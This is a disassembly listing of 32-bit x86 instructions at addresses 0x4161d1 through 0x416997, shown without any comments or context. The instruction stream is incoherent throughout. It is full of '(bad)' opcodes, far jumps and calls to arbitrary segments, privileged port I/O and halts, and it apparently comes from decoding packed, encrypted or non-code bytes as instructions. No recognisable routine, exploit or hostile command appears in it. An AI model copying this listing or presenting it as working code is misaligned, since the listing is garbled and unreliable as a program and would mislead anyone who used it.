  4161d1:	mov    ecx,0x15ab0d2c
  4161d6:	push   esi
  4161d7:	pop    ecx
  4161d8:	or     al,0x9f
  4161da:	or     eax,0xfadbdb
  4161df:	(bad)  
  4161e0:	pop    ebp
  4161e1:	nop
  4161e2:	pop    ebx
  4161e3:	mov    ds,esi
  4161e5:	mov    cl,BYTE PTR ds:0x358b6a8d
  4161eb:	ret    0xa386
  4161ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161ef:	jmp    0xb0a9d481
  4161f4:	sub    eax,0x525109bb
  4161f9:	js     0x41626a
  4161fb:	jmp    0x5e87629a
  416200:	push   ds
  416201:	and    DWORD PTR [esi],edx
  416203:	xor    dh,BYTE PTR [eax+edx*1-0x67]
  416207:	(bad)  
  416208:	xchg   edx,eax
  416209:	mov    ebp,0x7597b331
  41620e:	and    BYTE PTR [ecx],dh
  416210:	or     al,0x46
  416212:	pop    ss
  416213:	ja     0x416206
  416215:	sbb    eax,0xec5efc5d
  41621a:	test   edx,eax
  41621c:	mov    ebx,eax
  41621e:	into   
  41621f:	mov    dl,0xf7
  416221:	and    DWORD PTR [eax],edx
  416223:	xor    ah,BYTE PTR [edx+edx*8-0x55f35696]
  41622a:	jnp    0x4161e1
  41622c:	sbb    eax,0x707a5d63
  416231:	xchg   edx,eax
  416232:	call   0xb094:0xc7a213a8
  416239:	pushf  
  41623a:	call   0x3216cbe2
  41623f:	fsub   QWORD PTR [ebx+ebx*1]
  416242:	mov    bl,0x3c
  416244:	mov    bl,0xb
  416246:	mov    esi,DWORD PTR [ecx+esi*1+0x2a46d5b3]
  41624d:	int    0x71
  41624f:	mov    ah,0x9
  416251:	lock push ds
  416253:	cmp    al,0x96
  416255:	int3   
  416256:	xor    eax,0x23dae55f
  41625b:	lds    esp,FWORD PTR ds:0xc8ace838
  416261:	xchg   edx,eax
  416262:	cmp    ecx,edi
  416264:	data16 mov cl,0x43
  416267:	test   al,0xc5
  416269:	mov    dl,ah
  41626b:	jmp    0x786e:0x7d5d7179
  416272:	push   ds
  416273:	jmp    0xce419651
  416278:	or     DWORD PTR [eax+0x1f8a3497],esp
  41627e:	mov    dl,0x15
  416280:	inc    ecx
  416281:	inc    edi
  416282:	and    al,0x36
  416284:	scas   al,BYTE PTR es:[edi]
  416285:	push   ds
  416286:	and    al,0xe6
  416288:	cmp    cl,al
  41628a:	fst    QWORD PTR [esi-0x3f939fdd]
  416290:	stos   DWORD PTR es:[edi],eax
  416291:	push   cs
  416292:	and    esi,DWORD PTR [ebx+0x686782ed]
  416298:	cdq    
  416299:	inc    ebp
  41629a:	push   ecx
  41629b:	sti    
  41629c:	or     ah,al
  41629e:	mov    cs,eax
  4162a0:	mov    dl,0xd2
  4162a2:	es (bad) 
  4162a4:	push   gs
  4162a6:	ss push ss
  4162a8:	(bad)  
  4162a9:	fild   DWORD PTR [edi+ebx*2+0x67]
  4162ad:	mov    ebp,0x57ca5220
  4162b2:	pushf  
  4162b3:	stc    
  4162b4:	icebp  
  4162b5:	mov    dh,0x51
  4162b7:	mov    bh,0x53
  4162b9:	push   ebx
  4162ba:	mov    al,0x40
  4162bc:	push   edx
  4162bd:	imul   eax,esp,0x2f
  4162c0:	cld    
  4162c1:	mov    eax,0xc6376c8
  4162c6:	adc    ebp,esi
  4162c8:	xor    eax,0x724f899f
  4162cd:	lahf   
  4162ce:	pop    edi
  4162cf:	mov    edi,0xd3577c8d
  4162d4:	daa    
  4162d5:	not    DWORD PTR [esi]
  4162d7:	inc    ebp
  4162d8:	or     DWORD PTR [ebp-0x59],esi
  4162db:	sti    
  4162dc:	pop    es
  4162dd:	jae    0x4162d0
  4162df:	fmul   DWORD PTR [ecx]
  4162e1:	pop    ebx
  4162e2:	aam    0x27
  4162e4:	nop
  4162e5:	sbb    eax,0x1ef59992
  4162ea:	mov    ds:0xb965d2d5,eax
  4162ef:	ds cmp eax,0x75e3a682
  4162f5:	push   ebp
  4162f6:	in     al,dx
  4162f7:	xchg   edi,eax
  4162f8:	popa   
  4162f9:	mov    dh,0x8e
  4162fb:	push   0x1a8dd21b
  416300:	inc    ecx
  416301:	rcl    BYTE PTR [edx],cl
  416303:	hlt    
  416304:	xor    ebp,edi
  416306:	fmulp  st(4),st
  416308:	mov    al,0xf2
  41630a:	pop    es
  41630b:	nop
  41630c:	and    BYTE PTR [ebp*2-0x25495065],al
  416313:	jp     0x41633b
  416315:	inc    esi
  416316:	imul   ecx,DWORD PTR [edx+0x15],0xdf0f84b2
  41631d:	pop    es
  41631e:	lea    ecx,[edi-0x16ea2c87]
  416324:	sub    al,0x2
  416326:	jbe    0x416329
  416328:	sbb    dl,BYTE PTR [edx]
  41632a:	xchg   ecx,eax
  41632b:	out    0x6f,eax
  41632d:	(bad)  
  41632e:	push   ebx
  41632f:	shl    DWORD PTR [edx],1
  416331:	(bad)
  416334:	cdq    
  416335:	es cld 
  416337:	aas    
  416338:	shl    BYTE PTR [edx],0x81
  41633b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41633c:	stos   DWORD PTR es:[edi],eax
  41633d:	xchg   edi,eax
  41633e:	pop    esp
  41633f:	mov    esp,0x6085470d
  416344:	sbb    eax,0xa298175a
  416349:	ror    ebp,1
  41634b:	mov    al,ds:0xc98cabf3
  416350:	cmp    BYTE PTR [esi-0x1c29cc73],bh
  416356:	pushf  
  416357:	in     al,dx
  416358:	outs   dx,BYTE PTR ds:[esi]
  416359:	pusha  
  41635a:	bnd jg 0x4163d9
  41635d:	in     al,0x91
  41635f:	sub    al,0x1d
  416361:	pop    ds
  416362:	sahf   
  416363:	and    cl,cl
  416365:	dec    ebx
  416366:	or     ebp,DWORD PTR [ecx]
  416368:	push   0x5c
  41636a:	pop    ecx
  41636b:	stc    
  41636c:	lea    eax,[esi-0x48faa8b6]
  416372:	pop    esp
  416373:	or     ecx,DWORD PTR [ebx]
  416375:	mov    edi,0xd2670021
  41637a:	jecxz  0x416338
  41637c:	hlt    
  41637d:	sti    
  41637e:	test   al,0x75
  416380:	popa   
  416381:	dec    ebx
  416382:	jo     0x416315
  416384:	clc    
  416385:	addr16 jns 0x4163ef
  416388:	sbb    al,0xd0
  41638a:	out    dx,eax
  41638b:	ins    DWORD PTR es:[edi],dx
  41638c:	cmp    esp,DWORD PTR [ebp-0x70]
  41638f:	mov    esp,?
  416391:	cld    
  416392:	out    0x6c,al
  416394:	pop    ebx
  416395:	jno    0x4163c1
  416397:	cmc    
  416398:	ds gs dec ebp
  41639b:	mov    edi,ecx
  41639d:	jne    0x4163ae
  41639f:	push   esi
  4163a0:	sbb    al,dl
  4163a2:	push   cs
  4163a3:	mov    ds:0x4458ac16,eax
  4163a8:	pop    edx
  4163a9:	mov    ch,0x6
  4163ab:	mov    BYTE PTR [edi],bh
  4163ad:	aam    0x57
  4163af:	out    0xc8,eax
  4163b1:	xor    ebp,ebp
  4163b3:	mov    ds:0x93333327,eax
  4163b8:	or     edx,ecx
  4163ba:	ds cdq 
  4163bc:	cmp    DWORD PTR [edx+ebx*8],eax
  4163bf:	(bad)  
  4163c0:	dec    edi
  4163c1:	and    BYTE PTR [esp+ebp*1-0x19d797ee],ah
  4163c8:	cmp    al,0x4c
  4163ca:	rcr    DWORD PTR [ebp+0x4085aa88],cl
  4163d0:	cmp    DWORD PTR [ebx-0x56],0x1c57dc6d
  4163d7:	clc    
  4163d8:	test   eax,0xce9ddf3
  4163dd:	push   0x7f1b5b3
  4163e2:	or     ecx,DWORD PTR [ecx-0x70e6d2ac]
  4163e8:	sahf   
  4163e9:	imul   esi,DWORD PTR [ecx-0x78],0xa27654ca
  4163f0:	jmp    0x1d67:0xc4b8ffb5
  4163f7:	or     DWORD PTR [esi],esp
  4163f9:	retf   0x1e1b
  4163fc:	retf   
  4163fd:	dec    esp
  4163fe:	ja     0x41638e
  416400:	push   ecx
  416401:	jo     0x416398
  416403:	and    DWORD PTR [ebx-0x46],esi
  416406:	xor    ecx,edi
  416408:	push   eax
  416409:	lods   eax,DWORD PTR ds:[esi]
  41640a:	rcr    al,1
  41640c:	push   edi
  41640d:	jo     0x416469
  41640f:	sar    bh,1
  416411:	shl    ebp,cl
  416413:	pop    esi
  416414:	inc    ebx
  416415:	sub    DWORD PTR [edi-0x17],ebx
  416418:	clc    
  416419:	mov    dh,0x85
  41641b:	push   eax
  41641c:	mov    ?,WORD PTR [ecx-0x84379fd]
  416422:	mov    dh,0xe0
  416424:	or     al,0xb1
  416426:	shr    ch,1
  416428:	xchg   DWORD PTR [ebp-0x7dad1577],edi
  41642e:	call   0xc61b:0x41126be6
  416435:	sub    bh,0xba
  416438:	hlt    
  416439:	inc    BYTE PTR [eax+0x33]
  41643c:	pop    eax
  41643d:	and    dh,0xf2
  416440:	test   DWORD PTR [ecx+0x14],eax
  416443:	sbb    ebx,edi
  416445:	mov    DWORD PTR [esi],edi
  416447:	push   ebx
  416448:	dec    esi
  416449:	into   
  41644a:	pop    ss
  41644b:	mov    dh,0xb1
  41644d:	and    DWORD PTR [edx],ebp
  41644f:	loopne 0x416407
  416451:	aas    
  416452:	into   
  416453:	mov    eax,ds:0xaa9aefe3
  416458:	jo     0x4163f8
  41645a:	adc    dh,bh
  41645c:	mov    ds,ecx
  41645e:	add    eax,0x316c43ba
  416463:	imul   ebx,DWORD PTR [edi+0x5c5253f1],0xdbd44ff1
  41646d:	xor    ebx,0x15dc87d3
  416473:	cmp    DWORD PTR [ebp-0x666096c5],eax
  416479:	xchg   esi,eax
  41647a:	mov    esp,0xde67a9dd
  41647f:	fild   QWORD PTR [eax+0x74]
  416482:	cmp    ecx,edi
  416484:	and    dh,BYTE PTR [edi-0x3dc8a51e]
  41648a:	fwait
  41648b:	xchg   ecx,eax
  41648c:	mov    esi,0x2c3f5588
  416491:	out    dx,eax
  416492:	test   DWORD PTR [ecx-0x2f],esp
  416495:	mov    esp,0x376e5db9
  41649a:	dec    edx
  41649b:	adc    esp,edx
  41649d:	mov    BYTE PTR [eax+edi*8-0x4c1d49ae],0x6f
  4164a5:	ins    DWORD PTR es:[edi],dx
  4164a6:	mov    eax,ds:0x121edaf2
  4164ab:	pop    ecx
  4164ac:	push   ebp
  4164ad:	or     ah,BYTE PTR [ebx+0x3a]
  4164b0:	pop    eax
  4164b1:	jg     0x4164b9
  4164b3:	sbb    al,BYTE PTR [esi-0x2375a075]
  4164b9:	mov    ecx,0x2d33068b
  4164be:	push   edx
  4164bf:	add    al,BYTE PTR [edi+0x63e18ffa]
  4164c5:	jbe    0xdba37b2e
  4164cb:	dec    eax
  4164cc:	lds    esi,FWORD PTR [eax+0x42e2454e]
  4164d2:	(bad)  
  4164d3:	int    0x4a
  4164d5:	cmp    esp,DWORD PTR [edi-0xd4eb4f4]
  4164db:	or     al,BYTE PTR [ebp-0x27]
  4164de:	push   esp
  4164df:	mov    eax,DWORD PTR [eax-0x6d]
  4164e2:	lods   eax,DWORD PTR ds:[esi]
  4164e3:	addr16 cld 
  4164e5:	add    esp,DWORD PTR [edx-0x59]
  4164e8:	jl     0x416564
  4164ea:	adc    ebp,DWORD PTR [eax+0x11]
  4164ed:	add    dh,BYTE PTR [edi]
  4164ef:	sbb    ebp,esi
  4164f1:	mul    BYTE PTR [edx]
  4164f3:	push   edi
  4164f4:	in     eax,dx
  4164f5:	or     BYTE PTR [ebp-0x6459bb26],dh
  4164fb:	stc    
  4164fc:	add    esi,DWORD PTR [eax+edi*1+0x88636e2]
  416503:	sbb    esi,ebp
  416505:	outs   dx,DWORD PTR ds:[esi]
  416506:	jg     0x4164f6
  416508:	loope  0x41651a
  41650a:	push   eax
  41650b:	mov    ds:0x73fc9222,al
  416510:	pop    ebx
  416511:	daa    
  416512:	jne    0x416545
  416514:	in     al,dx
  416515:	push   edx
  416516:	pop    edx
  416517:	loopne 0x416575
  416519:	sbb    eax,0xa295af73
  41651e:	stc    
  41651f:	mov    ah,0x33
  416521:	push   ebp
  416522:	jnp    0x4164ec
  416524:	jp     0x41654a
  416526:	outs   dx,BYTE PTR ds:[esi]
  416527:	dec    edx
  416528:	xlat   BYTE PTR ds:[ebx]
  416529:	daa    
  41652a:	push   edi
  41652b:	cld    
  41652c:	or     bh,BYTE PTR [esi]
  41652e:	sbb    DWORD PTR [ecx-0x6a],0x8a2aa96a
  416535:	ret    0x1695
  416538:	xlat   BYTE PTR ds:[ebx]
  416539:	push   ds
  41653a:	(bad)  
  41653b:	mov    edx,0x57e294f5
  416540:	jmp    FWORD PTR [ecx-0xf]
  416543:	jbe    0x4165be
  416545:	sub    DWORD PTR [esp+eiz*4-0x7747a127],eax
  41654c:	xchg   edi,eax
  41654d:	mov    ds:0xf62d087b,al
  416552:	jg     0x416559
  416554:	out    0xcd,eax
  416556:	out    dx,al
  416557:	lahf   
  416558:	dec    ebp
  416559:	call   0x6387a80a
  41655e:	pop    esi
  41655f:	xchg   edi,eax
  416560:	push   ss
  416561:	in     eax,0x3f
  416563:	stc    
  416564:	jae    0x416545
  416566:	sbb    eax,0x17876fb8
  41656b:	push   edi
  41656c:	loope  0x416524
  41656e:	jns    0x41659d
  416570:	addr16 pop ecx
  416572:	add    al,0x4b
  416574:	xor    DWORD PTR [esi+0x76],0xd3d67ef9
  41657b:	outs   dx,DWORD PTR ds:[esi]
  41657c:	mov    ds:0x45ddb3bc,al
  416581:	stos   DWORD PTR es:[edi],eax
  416582:	adc    ecx,DWORD PTR [ebp+0xd]
  416585:	lea    edi,[eax]
  416587:	push   edi
  416588:	lods   eax,DWORD PTR ds:[esi]
  416589:	dec    eax
  41658a:	xor    bh,BYTE PTR ds:0x76b882a0
  416590:	stos   DWORD PTR es:[edi],eax
  416591:	sub    BYTE PTR [ecx],dl
  416593:	sub    edi,DWORD PTR [edi]
  416595:	jno    0x416574
  416597:	int    0x4b
  416599:	pusha  
  41659a:	jl     0x41660a
  41659c:	outs   dx,BYTE PTR ds:[esi]
  41659d:	sbb    eax,0x7685996d
  4165a2:	mov    bl,0x2
  4165a4:	cmp    eax,0xa46346d3
  4165a9:	mov    esi,0x5de2a540
  4165ae:	in     eax,dx
  4165af:	int    0xaf
  4165b1:	ins    BYTE PTR es:[edi],dx
  4165b2:	mov    ch,0x7f
  4165b4:	and    al,ah
  4165b6:	lods   eax,DWORD PTR ds:[esi]
  4165b7:	fxch   st(4)
  4165b9:	int    0xf9
  4165bb:	xchg   ebp,eax
  4165bc:	pusha  
  4165bd:	mov    cl,BYTE PTR [ebx-0x7e]
  4165c0:	xor    al,0x44
  4165c2:	adc    BYTE PTR [ecx-0x3e],ch
  4165c5:	lods   al,BYTE PTR ds:[esi]
  4165c6:	push   edi
  4165c7:	xor    dh,bl
  4165c9:	cli    
  4165ca:	cmp    DWORD PTR [ebp+0x47],ebx
  4165cd:	sub    edi,esp
  4165cf:	fs adc al,0x73
  4165d2:	add    al,BYTE PTR [eax-0x2f]
  4165d5:	cmp    ah,bh
  4165d7:	push   es
  4165d8:	je     0x41664f
  4165da:	iret   
  4165db:	sti    
  4165dc:	adc    esi,esp
  4165de:	xchg   DWORD PTR [eax],ebx
  4165e0:	test   DWORD PTR ds:0x494ca4f7,0xb93c94c9
  4165ea:	sub    eax,0x75cfa577
  4165ef:	cli    
  4165f0:	in     al,0xcb
  4165f2:	fsub   DWORD PTR [edx-0x6f20210e]
  4165f8:	xchg   edx,eax
  4165f9:	jmp    0x189fd8ef
  4165fe:	call   0x2468:0x4e1f2204
  416605:	nop
  416606:	scas   al,BYTE PTR es:[edi]
  416607:	aam    0x3f
  416609:	mov    al,ds:0xc370d036
  41660e:	xchg   edi,eax
  41660f:	inc    edi
  416610:	inc    edi
  416611:	and    eax,DWORD PTR [edi]
  416613:	cmc    
  416614:	inc    ecx
  416615:	dec    ecx
  416616:	xor    BYTE PTR [ebx+0x7f338809],0xba
  41661d:	lods   al,BYTE PTR ds:[si]
  41661f:	push   ecx
  416620:	mov    edx,0x599da052
  416625:	push   eax
  416626:	dec    esi
  416627:	inc    edi
  416628:	or     al,0x75
  41662a:	sub    al,0x9
  41662c:	mov    gs,WORD PTR [ebx+0x7c]
  41662f:	cwde   
  416630:	dec    eax
  416631:	mov    esp,0x551ef163
  416636:	fwait
  416637:	push   ds
  416638:	jg     0x416644
  41663a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41663b:	jmp    0x4165fc
  41663d:	adc    eax,0x3b940893
  416642:	add    DWORD PTR [ecx],ecx
  416644:	push   edi
  416645:	shl    DWORD PTR [edi-0x5afedb69],cl
  41664b:	inc    ebp
  41664c:	jecxz  0x4165f4
  41664e:	jo     0x4166b7
  416650:	clc    
  416651:	sbb    DWORD PTR [eax],0xdfaf7c38
  416657:	adc    eax,edi
  416659:	les    esi,FWORD PTR [esi+ecx*2+0x33a86984]
  416660:	loopne 0x4166d7
  416662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416663:	(bad)  
  416664:	dec    esp
  416665:	mov    bh,0xbf
  416667:	mov    esi,esp
  416669:	pop    ds
  41666a:	in     al,0x85
  41666c:	out    0xba,al
  41666e:	ins    DWORD PTR es:[edi],dx
  41666f:	mov    BYTE PTR [ebp+0x5d2ab27a],cl
  416675:	sahf   
  416676:	inc    ebx
  416677:	shl    DWORD PTR [ecx-0x7dde578c],0x7a
  41667e:	cmp    bh,bl
  416680:	add    dh,BYTE PTR [ebp+ebx*8-0x3f]
  416684:	(bad)  
  416685:	xchg   esp,eax
  416686:	dec    ebx
  416687:	(bad)  
  416688:	push   ss
  416689:	cwde   
  41668a:	xchg   BYTE PTR [esi+0x4292431],al
  416690:	sub    BYTE PTR [ebp-0xc],0x2d
  416694:	pop    esi
  416695:	icebp  
  416696:	dec    edx
  416697:	xchg   esi,eax
  416698:	push   eax
  416699:	jmp    0x1d2a:0x1a6731a4
  4166a0:	bound  esp,QWORD PTR [edx+0x7c4b6515]
  4166a6:	addr16 jp 0x4166ef
  4166a9:	add    al,0xd1
  4166ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ac:	xor    BYTE PTR [esi],bl
  4166ae:	in     eax,0xdc
  4166b0:	adc    DWORD PTR [ebx+0x10],ebx
  4166b3:	push   ebp
  4166b4:	sbb    DWORD PTR [ebx+0x6b],edi
  4166b7:	in     eax,dx
  4166b8:	(bad)  
  4166b9:	stc    
  4166ba:	es xchg esi,eax
  4166bc:	sub    ah,BYTE PTR [esp+edi*4+0x5a5d7b7f]
  4166c3:	xor    BYTE PTR [ebx-0x4c],al
  4166c6:	mov    bl,0xdb
  4166c8:	mov    bh,0x4a
  4166ca:	ins    BYTE PTR es:[edi],dx
  4166cb:	out    dx,eax
  4166cc:	popa   
  4166cd:	outs   dx,BYTE PTR ds:[esi]
  4166ce:	dec    ebp
  4166cf:	rcr    DWORD PTR [edx-0x30cb7c68],0x1f
  4166d6:	dec    ebp
  4166d7:	mov    ?,WORD PTR [edx-0x3d06d43e]
  4166dd:	mov    edx,0xea7ec9ee
  4166e2:	nop
  4166e3:	jp     0x4166d4
  4166e5:	and    al,0x40
  4166e7:	mov    BYTE PTR [ebx-0x48],0xf0
  4166eb:	fdivr  QWORD PTR [esi-0x45]
  4166ee:	mov    eax,0x92f74c02
  4166f3:	pusha  
  4166f4:	xchg   edx,eax
  4166f5:	and    BYTE PTR [ecx],bl
  4166f7:	xor    esp,DWORD PTR [ecx-0x7e]
  4166fa:	sbb    eax,0x78816eb6
  4166ff:	dec    edi
  416700:	xchg   esp,eax
  416701:	push   ebp
  416702:	je     0x4166c2
  416704:	fwait
  416705:	(bad)  
  416706:	pusha  
  416707:	fnstenv [edi]
  416709:	sti    
  41670a:	inc    ecx
  41670b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41670c:	cmc    
  41670d:	fucomi st,st(6)
  41670f:	xchg   ebx,eax
  416710:	nop
  416711:	stos   DWORD PTR es:[edi],eax
  416712:	sub    edx,ebx
  416714:	inc    eax
  416715:	dec    ebx
  416716:	mov    ch,0x90
  416718:	js     0x41671e
  41671a:	mov    eax,ds:0x1f9a3bb5
  41671f:	adc    eax,0xa89c0dbb
  416724:	sub    al,0x22
  416726:	retf   
  416727:	arpl   WORD PTR [ebp+ebp*1-0x25],sp
  41672b:	ins    DWORD PTR es:[edi],dx
  41672c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41672d:	ins    BYTE PTR es:[edi],dx
  41672e:	push   0xffffffec
  416730:	icebp  
  416731:	or     al,0x6b
  416733:	frstor [esi]
  416735:	inc    esi
  416736:	daa    
  416737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416738:	mov    cl,0x9e
  41673a:	in     al,0xfb
  41673c:	sti    
  41673d:	inc    edx
  41673e:	in     eax,0x1a
  416740:	arpl   WORD PTR [ebp+0xc],di
  416743:	mov    bh,BYTE PTR [ebx+0x18c8bec3]
  416749:	push   edi
  41674a:	imul   esi,DWORD PTR [ecx-0x39],0x6a
  41674e:	test   BYTE PTR [ebp+0x3f463d0f],al
  416754:	mov    bl,0x9a
  416756:	addr16 xchg ecx,eax
  416758:	pop    ecx
  416759:	adc    DWORD PTR [esi-0x40],ebx
  41675c:	test   DWORD PTR ds:0x43ea768f,edx
  416762:	iret   
  416763:	mov    ch,0xfd
  416765:	fcom   DWORD PTR [ecx]
  416767:	jae    0x41674e
  416769:	cmp    ch,BYTE PTR [edx+0x78]
  41676c:	cdq    
  41676d:	ror    BYTE PTR [edx-0x28fd6060],1
  416773:	scas   eax,DWORD PTR es:[edi]
  416774:	cmp    bl,cl
  416776:	dec    ebp
  416777:	jns    0x416791
  416779:	ss xchg ebx,eax
  41677b:	jg     0x4167a6
  41677d:	mov    BYTE PTR [edx-0xb],bh
  416780:	xor    dl,al
  416782:	xchg   ecx,eax
  416783:	hlt    
  416784:	pop    ebp
  416785:	aad    0x72
  416787:	mov    cl,0x33
  416789:	(bad)  
  41678a:	mov    ecx,0x782efaf2
  41678f:	push   ds
  416790:	dec    eax
  416791:	mov    al,ds:0xf2dd3d36
  416796:	fwait
  416797:	jno    0x416814
  416799:	pop    ebx
  41679a:	pushf  
  41679b:	xchg   ebx,eax
  41679c:	outs   dx,BYTE PTR ds:[esi]
  41679d:	pop    ebx
  41679e:	(bad)  
  41679f:	enter  0x1210,0x6a
  4167a3:	loopne 0x416764
  4167a5:	cli    
  4167a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167a7:	and    eax,0xae0b7a58
  4167ac:	lock pop edx
  4167ae:	or     al,0x7
  4167b0:	push   eax
  4167b1:	sub    al,0x5c
  4167b3:	push   eax
  4167b4:	cwde   
  4167b5:	retf   
  4167b6:	mov    ebx,0xe63c0413
  4167bb:	or     cl,BYTE PTR ds:0x826422b6
  4167c1:	sub    eax,eax
  4167c3:	mov    cl,0x10
  4167c5:	test   al,0xdc
  4167c7:	cmp    eax,0x90e381ae
  4167cc:	iret   
  4167cd:	xchg   BYTE PTR [ebx],cl
  4167cf:	outs   dx,DWORD PTR ds:[esi]
  4167d0:	outs   dx,DWORD PTR ds:[esi]
  4167d1:	xchg   esp,eax
  4167d2:	pop    edx
  4167d3:	sahf   
  4167d4:	xor    al,0xbd
  4167d6:	mov    dh,0x79
  4167d8:	enter  0xc3a,0xee
  4167dc:	xor    al,0xd4
  4167de:	xor    eax,0x381a10aa
  4167e3:	dec    ebp
  4167e4:	popf   
  4167e5:	push   eax
  4167e6:	(bad)  
  4167e7:	cmc    
  4167e8:	pop    ebx
  4167e9:	jae    0x416814
  4167eb:	adc    eax,0xf9e8a017
  4167f0:	adc    DWORD PTR [ecx+ebx*8+0x547de157],esp
  4167f7:	je     0x416857
  4167f9:	mov    bh,0xe3
  4167fb:	cmp    eax,0x45cfb191
  416800:	add    eax,0xcaf0295
  416805:	pop    ecx
  416806:	adc    al,0x6b
  416808:	and    esp,DWORD PTR [edi]
  41680a:	cmp    ebx,DWORD PTR [ecx+0x5b]
  41680d:	stos   BYTE PTR es:[edi],al
  41680e:	pop    edx
  41680f:	scas   al,BYTE PTR es:[edi]
  416810:	jo     0x41687a
  416812:	out    0x9c,eax
  416814:	mov    esi,DWORD PTR [edx+0x56]
  416817:	push   esi
  416818:	stos   BYTE PTR es:[edi],al
  416819:	xchg   ebx,eax
  41681a:	je     0x4167eb
  41681c:	mov    ecx,0xf60572b5
  416821:	cmp    ebx,DWORD PTR [ebp+0x3c80bc3]
  416827:	pop    ebp
  416828:	xor    dl,ah
  41682a:	cwde   
  41682b:	and    eax,0x55a0323e
  416830:	fisub  WORD PTR [eax-0x5a]
  416833:	gs out dx,eax
  416835:	jge    0x416845
  416837:	xchg   DWORD PTR [ebp+0x30d7bbb4],ebx
  41683d:	push   ecx
  41683e:	dec    edi
  41683f:	(bad)  
  416840:	mov    ebp,0xda40bb77
  416845:	popa   
  416846:	sub    bl,BYTE PTR [eax+0x472b5e0f]
  41684c:	aaa    
  41684d:	js     0x416895
  41684f:	sbb    bl,BYTE PTR [edx]
  416851:	ins    DWORD PTR es:[edi],dx
  416852:	and    al,0xfe
  416854:	cmp    BYTE PTR [edi],bl
  416856:	aam    0xf0
  416858:	dec    ebx
  416859:	imul   edx,DWORD PTR [ebx-0x448893cd],0xffffffdd
  416860:	imul   BYTE PTR [edi]
  416862:	inc    esi
  416863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416864:	mov    bh,0xab
  416866:	pushf  
  416867:	sysenter 
  416869:	pop    esi
  41686a:	push   ds
  41686b:	aad    0xf6
  41686d:	pop    esp
  41686e:	lods   al,BYTE PTR ds:[esi]
  41686f:	icebp  
  416870:	push   es
  416871:	test   BYTE PTR [ecx+0x8],cl
  416874:	and    DWORD PTR [ebx-0x4],edi
  416877:	mov    al,0x17
  416879:	idiv   bl
  41687b:	add    BYTE PTR [edi-0x6c],0x85
  41687f:	jne    0x4168ca
  416881:	pop    edi
  416882:	imul   edx,DWORD PTR [edi],0x7e
  416885:	jb     0x41682a
  416887:	mov    esp,0xd2ecb851
  41688c:	push   esp
  41688d:	daa    
  41688e:	das    
  41688f:	fistp  QWORD PTR [ebx-0xd4f77ea]
  416895:	iret   
  416896:	and    al,0x99
  416898:	add    eax,DWORD PTR [edi]
  41689a:	jg     0x416882
  41689c:	lds    eax,FWORD PTR [edi]
  41689e:	mov    eax,ecx
  4168a0:	xor    eax,0xd10c2f99
  4168a5:	push   esp
  4168a6:	sahf   
  4168a7:	sub    eax,0xa82c6ee
  4168ac:	sub    al,0xfa
  4168ae:	dec    DWORD PTR [esi-0x60]
  4168b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168b2:	fcomp  st(7)
  4168b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b5:	add    edi,DWORD PTR ds:0x2ba27fad
  4168bb:	sub    BYTE PTR [ecx],0xe6
  4168be:	xor    al,0x6a
  4168c0:	mov    ebp,0xd2702556
  4168c5:	retf   0x6c41
  4168c8:	sub    al,0xee
  4168ca:	and    ah,BYTE PTR [ebx-0x29]
  4168cd:	pop    ebx
  4168ce:	push   gs
  4168d0:	xor    al,0xba
  4168d2:	dec    ebp
  4168d3:	xchg   edi,eax
  4168d4:	xchg   ebx,eax
  4168d5:	inc    ebp
  4168d6:	adc    cl,bh
  4168d8:	rcr    BYTE PTR [ecx],1
  4168da:	jle    0x41687b
  4168dc:	jne    0x4168d0
  4168de:	icebp  
  4168df:	xor    DWORD PTR [esi+0x1b],ebx
  4168e2:	in     al,0x49
  4168e4:	mov    esi,edx
  4168e6:	scas   eax,DWORD PTR es:[edi]
  4168e7:	ret    0x32c5
  4168ea:	or     edi,DWORD PTR [ecx-0x1d]
  4168ed:	imul   ebp,edx,0xab82199d
  4168f3:	inc    si
  4168f5:	int    0x5b
  4168f7:	mov    edi,0xba181d36
  4168fc:	call   0x32ee3f85
  416901:	mov    eax,ds:0xfbbe2541
  416906:	sbb    eax,0xfb6e32c2
  41690b:	mov    ebx,0xcadc1841
  416910:	jns    0x41689c
  416912:	test   BYTE PTR ds:0xece6ba68,bh
  416918:	and    DWORD PTR [ebx+0x10187d7e],edi
  41691e:	push   edi
  41691f:	or     BYTE PTR [ebx+esi*8+0x555a25c],0xd6
  416927:	(bad)  
  416928:	jle    0x4168ce
  41692a:	push   cs
  41692b:	add    DWORD PTR [eax],ecx
  41692d:	loope  0x416958
  41692f:	jle    0x41696b
  416931:	cmp    DWORD PTR [eax+edx*1+0x17],ebp
  416935:	sar    BYTE PTR [ecx+esi*8],cl
  416938:	mov    ah,ch
  41693a:	push   ds
  41693b:	push   ss
  41693c:	jne    0x4168dd
  41693e:	mov    edx,0x6dac7398
  416943:	mov    edi,0x47f727f1
  416948:	cli    
  416949:	xor    al,0xa5
  41694b:	dec    eax
  41694c:	fnstenv [edx-0x2a]
  41694f:	out    dx,al
  416950:	add    DWORD PTR [ebp+0x4d19f78c],eax
  416956:	cmp    eax,0xd8a2efd2
  41695b:	pusha  
  41695c:	mul    BYTE PTR [ecx-0x72e28845]
  416962:	inc    edx
  416963:	push   edx
  416964:	sbb    eax,esp
  416966:	mov    bl,0x30
  416968:	or     edx,ebx
  41696a:	add    bh,al
  41696c:	aam    0x4d
  41696e:	repz add BYTE PTR [ebp+0x4d1491a1],al
  416975:	adc    al,BYTE PTR [edi]
  416977:	push   0xffffff8a
  416979:	mov    dl,0xa7
  41697b:	jno    0x416922
  41697d:	and    DWORD PTR [ebp+0x2f],ebx
  416980:	inc    ebp
  416981:	stos   DWORD PTR es:[edi],eax
  416982:	push   edi
  416983:	test   eax,0x3a4fa39
  416988:	push   esp
  416989:	repz pop ebx
  41698b:	js     0x41696d
  41698d:	or     DWORD PTR [ebx+0x2d8da656],0x450a0f6c
  416997:	sub    al,ch
